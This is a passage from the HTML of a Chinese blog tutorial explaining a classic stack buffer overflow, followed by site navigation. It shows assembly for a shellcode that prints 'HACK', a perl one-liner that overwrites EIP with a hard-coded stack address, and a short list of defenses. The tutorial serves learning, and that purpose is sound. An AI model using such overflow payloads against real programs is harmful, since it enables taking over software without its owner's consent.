ecx, esp  </span><br><span class="line">mov dl, 5  </span><br><span class="line">mov al, 4  </span><br><span class="line">int 0x80  </span><br><span class="line">  </span><br><span class="line">mov al, 1  </span><br><span class="line">mov bl, 1  </span><br><span class="line">dec bl  </span><br><span class="line">int 0x80  </span><br><span class="line">  </span><br><span class="line">string:  </span><br><span class="line">db &quot;HACK&quot;, 0xa</span><br></pre></td></tr></table></figure></p>
+<p>再编译程序：</p>
+<blockquote>
+<p>nasm -o shell shell.s</p>
+</blockquote>
+<p>之后反编译：</p>
+<blockquote>
+<p>ndisasm shell1</p>
+</blockquote>
+<p>得到如下结果：<br><img src="http://img.wandoutech.com/img/142113.png" alt></p>
+<p>&emsp;现在我们找到了EIP的位置，也有了我们要执行的shellcode，但这个EIP应该修改为什么值，才能在函数返回时执行注入的shellcode呢？<br>&emsp;我们可以这样想，从栈的基本模型上看(下图)，当函数返回，弹出EBP(栈基址)，恢复堆栈到调用函数时的地址，再弹出返回地址到EIP，ESP寄存器的值(栈指针)向上移动，指向我们的shellcode。因此，我们使用上面的注入内容生成core时，ESP寄存器的值就是shellcode的开始地址，也就是EIP应该注入的值。<br><img src="http://img.wandoutech.com/img/142143.png" alt></p>
+<h2 id="五、注入shellcode"><a href="#五、注入shellcode" class="headerlink" title="五、注入shellcode"></a>五、注入shellcode</h2><p>我们知道要成功执行shellcode就要使EIP的值为shellcode开始的地址。那如何找到shellcode开始的地址呢？我们先尝试着把构造好的shellcode文本给程序执行，使它生成新的core。(这里要先删掉之前的core文件)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;B&quot;x4 . &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x48\x41\x43\x4b\x0a&quot;&apos; &gt; test.txt ;./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.wandoutech.com/img/142156.png" alt></p>
+<blockquote>
+<p>再执行gdb  ./bo core –q</p>
+</blockquote>
+<p><img src="http://img.wandoutech.com/img/142214.png" alt></p>
+<p>上面我们知道，ESP的值就是shellcode开始的地址，ESP现在值为0xffffcf70，所有EIP注入值就是该值，(这一步一定要关闭地址随机化功能)。由于X86是小端的字节序，所以注入字节串需要改为”\x70\xcf\xff\xff”<br>然后将EIP原来的注入值’BBBB’变成”\x70\xcf\xff\xff”，使eip指向的地址为shellcode开始运行的地址即可。再次测试：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &apos;printf &quot;A&quot;x48 . &quot;\x70\xcf\xff\xff&quot; . &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb3\x01\x83\xc4\x1d\x89\xe1\xb2\x05\xb0\x04\xcd\x80\xb0\x01\xb3\x01\xfe\xcb\xcd\x80\x48\x41\x43\x4b\x0a&quot;&apos;&gt; test.txt ;./bo</span><br></pre></td></tr></table></figure>
+<p><img src="http://img.wandoutech.com/img/142241.png" alt><br>结果：程序输出HACK字符串了，说明我们成功控制了EIP，并执行了shellcode。<br>如果这段shellcode构造的再复杂一些，我们就能做更多的事。(坏笑~)<br>&emsp;这也是算是最简单的缓冲区溢出漏洞攻击的例子了，所讲的技术也有点过时，对于现在的系统来讲，已经不大可能管用了。但不管怎么样，对于初步的学习还是很助于理解的。一切的学习可以从这个简单的例子出发，一步步的进行更深入下去。然后在其中发现更多的精彩。</p>
+<h1 id="缓冲区溢出攻击的防范"><a href="#缓冲区溢出攻击的防范" class="headerlink" title="缓冲区溢出攻击的防范"></a>缓冲区溢出攻击的防范</h1><p>了解攻击原理是为了能更好的进行防御，最后简要的说明一下如何防范这类攻击的发生。<br>(1)关闭不需要的特权程序。<br>(2)及时给系统和服务程序漏洞打补丁。<br>(3)强制写正确的代码。<br>(4)通过操作系统使得缓冲区不可执行，从而阻止攻击者植入攻击代码。<br>(5)利用编译器的边界检查来实现缓冲区的保护，这个方法使得缓冲区溢出不可能出现，从而完全消除了缓冲区溢出的威胁，但是代价比较大。<br>(6)在程序指针失效前进行完整性检查。<br>(7)改进系统内部安全机制。</p>
+<hr>
+<p><strong><em>参考文章</em></strong>：<a href="https://blog.csdn.net/linyt/article/details/43283331" target="_blank" rel="noopener">https://blog.csdn.net/linyt/article/details/43283331</a><br><strong><em>发表链接</em></strong>：<a href="https://segmentfault.com/a/1190000015993766" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015993766</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://wang66.top">王六六</a>
+            </p><p>原文链接: <a href="http://wang66.top/2018/浅析缓冲区溢出.html">http://wang66.top/2018/浅析缓冲区溢出.html</a>
+            </p><p>发表日期: <a href="http://wang66.top/2018/浅析缓冲区溢出.html">August 18th 2018, 4:49:06 pm</a>
+            </p><p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2018/ARP毒化.html" title="来自身边的安全威胁—ARP欺骗攻击">
+                    <div class="nextTitle">来自身边的安全威胁—ARP欺骗攻击</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+    <div id="comment"></div>
+    <script>
+    new Valine({
+        el: '#comment' ,
+        notify: "true", 
+        verify: false, 
+        appId: "kBws43cqYyOkzvJkwd7PwiQ3-gzGzoHsz",
+        appKey: "IEbfjsLgEhcgfFfWicWSYdhf",
+        placeholder: "来评论一下吧~",
+        path:window.location.pathname, 
+		avatar: 'robohash' // (''/mp/identicon/monsterid/wavatar/robohash/retro/hide)
+    });
+    </script>
+
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:wangji19971013@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wang66just6" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/wechat.png">
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title="qq">
+                  
+                  <img class="profile-qr" src="/assets/qq.jpg">
+                </span>
+            
+        
+    
+        
+            
+                <a href="//weibo.com/wang66just6" class="iconfont-archer weibo" target="_blank" title="weibo"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="//twitter.com/wang66just6" class="iconfont-archer twitter" target="_blank" title="twitter"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span><br>
+		<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+		<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+	<script>
+		var now = new Date(); 
+		function createtime() { 
+			var grt= new Date("08/01/2018 12:00:00");//此处修改你的建站时间或者网站上线时间 
+			now.setTime(now.getTime()+250); 
+			days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+			hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+			if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+			mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+			seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+			snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+			document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 "; 
+			document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+		} 
+	setInterval("createtime()",250);
+	</script>
+    </div>
+    <!-- 不蒜子  -->
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区溢出及其原理"><span class="toc-number">1.</span> <span class="toc-text">缓冲区溢出及其原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#编译源程序"><span class="toc-number">1.1.</span> <span class="toc-text">编译源程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#执行程序"><span class="toc-number">1.2.</span> <span class="toc-text">执行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#原因分析"><span class="toc-number">1.3.</span> <span class="toc-text">原因分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区溢出攻击例子"><span class="toc-number">2.</span> <span class="toc-text">缓冲区溢出攻击例子</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、创建程序"><span class="toc-number">2.1.</span> <span class="toc-text">一、创建程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二、编译程序"><span class="toc-number">2.2.</span> <span class="toc-text">二、编译程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、覆盖EIP"><span class="toc-number">2.3.</span> <span class="toc-text">三、覆盖EIP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#四、构造shellcode"><span class="toc-number">2.4.</span> <span class="toc-text">四、构造shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#五、注入shellcode"><span class="toc-number">2.5.</span> <span class="toc-text">五、注入shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#缓冲区溢出攻击的防范"><span class="toc-number">3.</span> <span class="toc-text">缓冲区溢出攻击的防范</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 19
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span><a class="archive-post-title" href="/2020/ELF-formt.html">ELF文件格式</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/2020/How-The-Kernel-Manages-Your-Memory.html">How The Kernel Manages Your Memory</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/Anatomy-of-a-Program-in-Memory.html">Anatomy of a Program in Memory</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href="/2019/port-knocking.html">端口敲门</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/19</span><a class="archive-post-title" href="/2019/Information-collection.html">信息收集总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/02</span><a class="archive-post-title" href="/2019/powershell-attack.html">PowerShell攻击技术</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/05</span><a class="archive-post-title" href="/2018/vulnhub-ch4inrulz1-0-1.html">Vulnhub渗透笔记之ch4inrulz:1.0.1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/02</span><a class="archive-post-title" href="/2018/vulnhub-lampiao1.html">VulnHub渗透笔记之Lampio1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/01</span><a class="archive-post-title" href="/2018/vulnhub-wankada1.html">Vulnhub渗透笔记之wankanda1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/30</span><a class="archive-post-title" href="/2018/vulnhub-node1.html">Vulnhub渗透笔记之Node:1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/24</span><a class="archive-post-title" href="/2018/The-mathematics-of-cryptography.html">浅谈密码学中的数学基础</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href="/2018/linux-rookit.html">Linux后门检测与系统恢复</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/10</span><a class="archive-post-title" href="/2018/HistoryofMCD.html">恶意代码发展简史</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/2018/soyouwantobeahacker.html">所以你想成为黑客？</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span><a class="archive-post-title" href="/2018/website-attack.html">社会工程学攻击之网站钓鱼</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href="/2018/隐写术之LSB隐写.html">隐写术之LSB隐写</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href="/2018/一次恶意PHP脚本初探.html">一次恶意PHP脚本初探</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href="/2018/ARP毒化.html">来自身边的安全威胁—ARP欺骗攻击</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/18</span><a class="archive-post-title" href="/2018/浅析缓冲区溢出.html">浅析缓冲区溢出</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="局域网"><span class="iconfont-archer">&#xe606;</span>局域网</span>
+    
+        <span class="sidebar-tag-name" data-tags="arp"><span class="iconfont-archer">&#xe606;</span>arp</span>
+    
+        <span class="sidebar-tag-name" data-tags="中间人攻击"><span class="iconfont-archer">&#xe606;</span>中间人攻击</span>
+    
+        <span class="sidebar-tag-name" data-tags="系统原理"><span class="iconfont-archer">&#xe606;</span>系统原理</span>
+    
+        <span class="sidebar-tag-name" data-tags="翻译"><span class="iconfont-archer">&#xe606;</span>翻译</span>
+    
+        <span class="sidebar-tag-name" data-tags="恶意代码"><span class="iconfont-archer">&#xe606;</span>恶意代码</span>
+    
+        <span class="sidebar-tag-name" data-tags="计算机病毒"><span class="iconfont-archer">&#xe606;</span>计算机病毒</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnhub"><span class="iconfont-archer">&#xe606;</span>vulnhub</span>
+    
+        <span class="sidebar-tag-name" data-tags="密码学"><span class="iconfont-archer">&#xe606;</span>密码学</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="rootkit"><span class="iconfont-archer">&#xe606;</span>rootkit</span>
+    
+        <span class="sidebar-tag-name" data-tags="powershell"><span class="iconfont-archer">&#xe606;</span>powershell</span>
+    
+        <span class="sidebar-tag-name" data-tags="资源，翻译"><span class="iconfont-archer">&#xe606;</span>资源，翻译</span>
+    
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="社会工程学"><span class="iconfont-archer">&#xe606;</span>社会工程学</span>
+    
+        <span class="sidebar-tag-name" data-tags="隐写术"><span class="iconfont-archer">&#xe606;</span>隐写术</span>
+    
+        <span class="sidebar-tag-name" data-tags="lsb隐写"><span class="iconfont-archer">&#xe606;</span>lsb隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="缓冲区"><span class="iconfont-archer">&#xe606;</span>缓冲区</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="资源"><span class="iconfont-archer">&#xe60a;</span>资源</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "王六六"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
